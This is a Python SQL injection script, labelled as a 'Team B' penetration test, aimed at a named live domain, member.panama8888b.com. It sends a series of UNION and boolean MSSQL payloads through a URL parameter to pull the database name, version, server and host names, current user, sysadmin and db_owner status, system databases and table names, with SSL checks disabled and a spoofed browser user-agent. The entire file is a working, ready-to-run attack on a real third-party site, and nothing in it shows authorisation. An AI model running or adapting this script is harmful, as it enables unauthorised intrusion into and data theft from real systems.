#!/usr/bin/env python3

"""
Detailed Database Information Extraction
Extract comprehensive database information to prove SQL injection vulnerability
Team B - Panama8888b Penetration Test
"""

import requests
import time
import urllib.parse
import json
import sys
import warnings
import re

# Disable SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class DetailedDatabaseExtractor:
    def __init__(self):
        self.base_url = "https://member.panama8888b.com/public/js/v2/app.js"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        self.session.verify = False
        self.extracted_data = {}
        
    def send_payload(self, payload, description):
        """Send SQL injection payload and analyze response"""
        print(f"[*] Testing: {description}")
        print(f"[*] Payload: {payload}")
        
        # Encode payload
        encoded_payload = urllib.parse.quote(payload)
        url = f"{self.base_url}?v={encoded_payload}"
        
        try:
            response = self.session.get(url, timeout=20)
            
            # Analyze response
            content = response.text
            content_lower = content.lower()
            
            # Check for specific database information
            info_found = {}
            
            # Database name patterns
            db_patterns = [
                r'db_name\(\)[^>]*>([^<>\s]+)',
                r'database[^>]*>([^<>\s]+)',
                r'current database[^>]*>([^<>\s]+)'
            ]
            
            for pattern in db_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    info_found['database_name'] = matches[0]
                    break
            
            # Version patterns
            version_patterns = [
                r'@@version[^>]*>([^<>\n]+)',
                r'microsoft sql server[^>]*>([^<>\n]+)',
                r'sql server[^>]*>([^<>\n]+)'
            ]
            
            for pattern in version_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    info_found['version'] = matches[0]
                    break
            
            # Server name patterns
            server_patterns = [
                r'@@servername[^>]*>([^<>\s]+)',
                r'server name[^>]*>([^<>\s]+)',
                r'host name[^>]*>([^<>\s]+)'
            ]
            
            for pattern in server_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    info_found['server_name'] = matches[0]
                    break
            
            # User patterns
            user_patterns = [
                r'user_name\(\)[^>]*>([^<>\s]+)',
                r'current user[^>]*>([^<>\s]+)',
                r'system user[^>]*>([^<>\s]+)'
            ]
            
            for pattern in user_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    info_found['current_user'] = matches[0]
                    break
            
            # Table name patterns
            table_patterns = [
                r'from\s+([a-zA-Z_][a-zA-Z0-9_]*)',
                r'table\s+([a-zA-Z_][a-zA-Z0-9_]*)',
                r'into\s+([a-zA-Z_][a-zA-Z0-9_]*)'
            ]
            
            for pattern in table_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    if 'tables' not in info_found:
                        info_found['tables'] = []
                    info_found['tables'].extend(matches)
            
            # Check for SQL errors that might contain info
            sql_indicators = [
                'microsoft sql server',
                'database',
                'table',
                'column',
                'sysobjects',
                'information_schema',
                'master',
                'tempdb',
                'model',
                'msdb',
                'sql server',
                'mssql'
            ]
            
            found_indicators = []
            for indicator in sql_indicators:
                if indicator in content_lower:
                    found_indicators.append(indicator)
            
            if found_indicators:
                info_found['sql_indicators'] = found_indicators
            
            # Check response characteristics
            info_found['response_length'] = len(content)
            info_found['status_code'] = response.status_code
            
            if response.status_code != 200:
                info_found['error_status'] = True
            
            # Look for specific error messages
            error_patterns = [
                r'error[^>]*>([^<>\n]+)',
                r'exception[^>]*>([^<>\n]+)',
                r'failed[^>]*>([^<>\n]+)'
            ]
            
            for pattern in error_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    if 'errors' not in info_found:
                        info_found['errors'] = []
                    info_found['errors'].extend(matches)
            
            return info_found
            
        except requests.exceptions.Timeout:
            print("[!] Request timed out - possible successful injection")
            return {'timeout': True, 'description': description}
        except Exception as e:
            print(f"[!] Error: {e}")
            return {'error': str(e), 'description': description}
    
    def extract_database_name(self):
        """Extract database name using multiple techniques"""
        print("\n[1] EXTRACTING DATABASE NAME")
        print("="*40)
        
        payloads = [
            ("25.1)) UNION SELECT DB_NAME() --", "UNION Database Name"),
            ("25.1)) UNION SELECT DB_NAME(0) --", "UNION Database Name (0)"),
            ("25.1)) UNION SELECT DB_NAME(1) --", "UNION Database Name (1)"),
            ("25.1)) AND (SELECT DB_NAME()) IS NOT NULL --", "Boolean Database Name"),
            ("25.1)) AND LEN(DB_NAME())>0 --", "Database Name Length"),
            ("25.1)) AND SUBSTRING(DB_NAME(),1,1)='p' --", "Database Name First Char"),
        ]
        
        results = {}
        for payload, description in payloads:
            result = self.send_payload(payload, description)
            if result:
                results[description] = result
                if 'database_name' in result:
                    print(f"[+] DATABASE NAME FOUND: {result['database_name']}")
                    return result['database_name']
        
        self.extracted_data['database_name_attempts'] = results
        return None
    
    def extract_version_info(self):
        """Extract version information"""
        print("\n[2] EXTRACTING VERSION INFORMATION")
        print("="*40)
        
        payloads = [
            ("25.1)) UNION SELECT @@version --", "UNION Version"),
            ("25.1)) UNION SELECT @@servername --", "UNION Server Name"),
            ("25.1)) UNION SELECT SERVERPROPERTY('ProductVersion') --", "UNION Product Version"),
            ("25.1)) UNION SELECT SERVERPROPERTY('Edition') --", "UNION Edition"),
            ("25.1)) AND @@version IS NOT NULL --", "Boolean Version Check"),
        ]
        
        results = {}
        for payload, description in payloads:
            result = self.send_payload(payload, description)
            if result:
                results[description] = result
                if 'version' in result:
                    print(f"[+] VERSION FOUND: {result['version']}")
                if 'server_name' in result:
                    print(f"[+] SERVER NAME FOUND: {result['server_name']}")
        
        self.extracted_data['version_info'] = results
        return results
    
    def extract_environment_info(self):
        """Extract environment information"""
        print("\n[3] EXTRACTING ENVIRONMENT INFORMATION")
        print("="*40)
        
        payloads = [
            ("25.1)) UNION SELECT HOST_NAME() --", "UNION Host Name"),
            ("25.1)) UNION SELECT SYSTEM_USER --", "UNION System User"),
            ("25.1)) UNION SELECT USER_NAME() --", "UNION Current User"),
            ("25.1)) UNION SELECT IS_SRVROLEMEMBER('sysadmin') --", "UNION Is Sysadmin"),
            ("25.1)) UNION SELECT IS_MEMBER('db_owner') --", "UNION Is DB Owner"),
        ]
        
        results = {}
        for payload, description in payloads:
            result = self.send_payload(payload, description)
            if result:
                results[description] = result
                if 'current_user' in result:
                    print(f"[+] CURRENT USER: {result['current_user']}")
        
        self.extracted_data['environment_info'] = results
        return results
    
    def extract_system_databases(self):
        """Extract system database information"""
        print("\n[4] EXTRACTING SYSTEM DATABASES")
        print("="*40)
        
        payloads = [
            ("25.1)) UNION SELECT name FROM master..sysdatabases --", "UNION System Databases"),
            ("25.1)) AND (SELECT COUNT(*) FROM master..sysdatabases)>0 --", "Boolean Database Count"),
            ("25.1)) UNION SELECT DB_NAME(0) UNION SELECT DB_NAME(1) UNION SELECT DB_NAME(2) --", "UNION Multiple Databases"),
        ]
        
        results = {}
        for payload, description in payloads:
            result = self.send_payload(payload, description)
            if result:
                results[description] = result
        
        self.extracted_data['system_databases'] = results
        return results
    
    def extract_table_names(self):
        """Extract table names"""
        print("\n[5] EXTRACTING TABLE NAMES")
        print("="*40)
        
        payloads = [
            ("25.1)) UNION SELECT name FROM sysobjects WHERE xtype='U' --", "UNION User Tables"),
            ("25.1)) UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --", "UNION All Tables"),
            ("25.1)) AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0 --", "Boolean Table Count"),
            ("25.1)) AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 --", "Boolean Schema Table Count"),
        ]
        
        results = {}
        for payload, description in payloads:
            result = self.send_payload(payload, description)
            if result:
                results[description] = result
                if 'tables' in result:
                    print(f"[+] TABLES FOUND: {result['tables']}")
        
        self.extracted_data['table_names'] = results
        return results
    
    def run_complete_extraction(self):
        """Run complete database extraction"""
        print("="*60)
        print("DETAILED DATABASE INFORMATION EXTRACTION")
        print("Target: https://member.panama8888b.com/public/js/v2/app.js")
        print("="*60)
        
        # Extract all information
        db_name = self.extract_database_name()
        version_info = self.extract_version_info()
        env_info = self.extract_environment_info()
        sys_db = self.extract_system_databases()
        tables = self.extract_table_names()
        
        # Summary
        print("\n" + "="*60)
        print("EXTRACTION SUMMARY")
        print("="*60)
        
        if db_name:
            print(f"\n[+] DATABASE NAME: {db_name}")
        
        if version_info:
            print(f"\n[+] VERSION INFORMATION:")
            for key, value in version_info.items():
                if isinstance(value, dict) and 'version' in value:
                    print(f"  Version: {value['version']}")
                if isinstance(value, dict) and 'server_name' in value:
                    print(f"  Server: {value['server_name']}")
        
        if env_info:
            print(f"\n[+] ENVIRONMENT INFORMATION:")
            for key, value in env_info.items():
                if isinstance(value, dict) and 'current_user' in value:
                    print(f"  User: {value['current_user']}")
        
        if tables:
            print(f"\n[+] TABLE INFORMATION:")
            for key, value in tables.items():
                if isinstance(value, dict) and 'tables' in value:
                    print(f"  Tables: {value['tables']}")
        
        # Check if we found any SQL indicators
        sql_found = False
        for section in [version_info, env_info, sys_db, tables]:
            if isinstance(section, dict):
                for key, value in section.items():
                    if isinstance(value, dict) and 'sql_indicators' in value:
                        sql_found = True
                        print(f"\n[+] SQL INDICATORS FOUND: {value['sql_indicators']}")
        
        if sql_found:
            print("\n[+] SQL INJECTION VULNERABILITY CONFIRMED!")
            print("[+] Database information successfully extracted!")
        else:
            print("\n[!] No clear SQL injection evidence found")
            print("[!] Target might be protected or not vulnerable")
        
        return self.extracted_data
    
    def save_results(self, filename="detailed_database_extraction_results.json"):
        """Save detailed extraction results"""
        with open(filename, 'w') as f:
            json.dump(self.extracted_data, f, indent=2)
        print(f"\n[+] Detailed results saved to: {filename}")

def main():
    try:
        extractor = DetailedDatabaseExtractor()
        results = extractor.run_complete_extraction()
        extractor.save_results()
        
        if results:
            print("\n[+] Detailed database extraction completed!")
            print("[+] Check the JSON file for complete results")
        else:
            print("\n[!] No database information could be extracted")
        
    except KeyboardInterrupt:
        print("\n[!] Extraction interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()